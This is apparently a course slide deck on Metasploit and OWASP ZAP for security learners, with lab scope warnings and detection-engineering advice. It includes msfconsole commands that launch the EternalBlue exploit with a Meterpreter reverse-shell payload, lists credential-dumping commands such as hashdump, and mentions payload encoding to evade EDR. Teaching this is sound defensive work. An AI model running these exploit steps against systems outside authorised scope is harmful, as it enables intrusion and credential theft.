🔫 What is Metasploit?

An exploitation framework, not just a tool

The Metasploit Framework is a Ruby-based collection of 2,000+ modules — exploits, payloads, encoders, post-exploitation utilities — with a uniform CLI (msfconsole) and an MSGRPC API.

  • Originally Rapid7's open-source platform; community + pro editions
  • Pre-installed on Kali Linux
  • Used by red teams, IR responders, and exploit researchers
Stress: the same tooling defenders run is what attackers use. Knowing it helps both sides.

💻 msfconsole — the basics

# Search for a known vuln
msf6 > search cve:2017-0144

# Pick an exploit, see required options
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > show options

# Set target & payload
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.10.10.5
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(ms17_010_eternalblue) > set LHOST 10.10.10.99

# Fire
msf6 exploit(ms17_010_eternalblue) > run
Workflow: search → use → show options → set → check → run.
Have a cheat-sheet handout for the lab. The CLI is intuitive once you know the verbs.

🎬 Sessions & Meterpreter

  • Successful exploitation opens a session — a control channel back to the target
  • Meterpreter is the most-used payload: in-memory, encrypted, scriptable
  • Common Meterpreter commands: sysinfo, getuid, hashdump, screenshot, portfwd, route
  • Sessions can be backgrounded (bg), interacted with (sessions -i 1), or killed
Lab discipline: only target the lab Metasploitable host. Anything else requires written scope.
Meterpreter is the point where "interesting" starts — pivoting, post-exploitation, etc. Keep the lab simple to avoid time blowouts.

🛡️ Defender's view of Metasploit

  • EDR signatures aggressively flag default Meterpreter
  • Encoded payloads & custom templates can evade — use this to test detection coverage
  • Use it intentionally: run the exact module a CVE corresponds to and verify your alerting catches it
Detection-engineering practice: for each ATT&CK technique you care about, run the matching Metasploit module against a test host and watch the SIEM.
This is the "purple-team" use of Metasploit. Far more useful than ad-hoc red-team work.

Part 2 — OWASP ZAP

Web-app DAST & intercepting proxy

Switch contexts: web apps. ZAP is the open-source counterpart to Burp Suite Pro.

🦎 What is OWASP ZAP?

Zed Attack Proxy

An open-source web application security scanner. Functions as both an intercepting proxy for manual testing and an automated scanner for CI/CD.

  • Three modes: GUI desktop, headless daemon, container image
  • REST API + automation framework for pipeline use
  • Active community, dozens of add-ons
  • Free, OWASP flagship project
Module 9 will integrate ZAP into Jenkins. Today is about understanding what it does.

📝 ZAP — core concepts

Spider

Crawls the app to build a site tree. Two flavours: traditional + AJAX (uses a real browser).

Passive scan

Inspects every request/response that flows through the proxy. Doesn't generate traffic itself. Safe.

Active scan

Sends purpose-built attack traffic (XSS, SQLi, etc.) to discovered endpoints. Aggressive.

Active scans can break things. Run on a lab/test environment, never directly on production without scope.
Most learners want to "just active-scan everything." Reinforce: passive first, then targeted active.

🔎 A typical manual ZAP workflow

  1. Configure browser to use ZAP as proxy (localhost:8080) & install ZAP CA
  2. Browse the app like a normal user — passive scan runs in the background
  3. Run the spider / AJAX spider to discover hidden endpoints
  4. Review passive findings — cookie flags, headers, info leaks
  5. Run targeted active scan against a specific URL or context
  6. Inspect & reissue requests via Manual Request Editor / Repeater
  7. Export the report (HTML, JSON, SARIF)
SARIF export plugs nicely into GitHub code scanning + GitHub Actions / GitLab CI work-item creation.

🐋 Headless ZAP for automation

# Baseline scan — passive only, fast, CI-friendly
docker run --rm -t \
  -v $(pwd):/zap/wrk:rw \
  ghcr.io/zaproxy/zaproxy:stable \
  zap-baseline.py -t https://target.local -r baseline-report.html

# Full scan — passive + active, slower
docker run --rm -t \
  -v $(pwd):/zap/wrk:rw \
  ghcr.io/zaproxy/zaproxy:stable \
  zap-full-scan.py -t https://target.local -r full-report.html
In Jenkins / GitHub Actions: zap-baseline.py for every PR, zap-full-scan.py nightly against staging.
Module 9 will turn this command into a Jenkins stage. Good to see it standalone first.

🔐 Scanning behind login

  • Form-based: ZAP auth scripts — record-and-replay a login
  • Token-based: set a session header in context
  • OAuth / IAM Identity Center: obtain a token outside ZAP, inject as bearer
  • Verify auth still works mid-scan with a "logged-in" indicator
Without auth, ZAP only sees the unauthenticated surface. Most app risk lives behind login.
Auth setup is where most ZAP-in-CI projects get stuck. Plan for it.

⚖️ What ZAP & Metasploit do not find

  • Business-logic flaws — "discount applied 10 times" needs a human
  • Authorisation bypass between roles — needs context the tool doesn't have
  • Race conditions — tool is sequential, attacker is parallel
  • Chained vulns — tools find atomic findings; attackers stitch them together
  • Cryptographic protocol mistakes — need design review, not scanning
Hammer this home: tools are necessary, never sufficient. Manual testing pays for itself precisely on the high-impact issues.
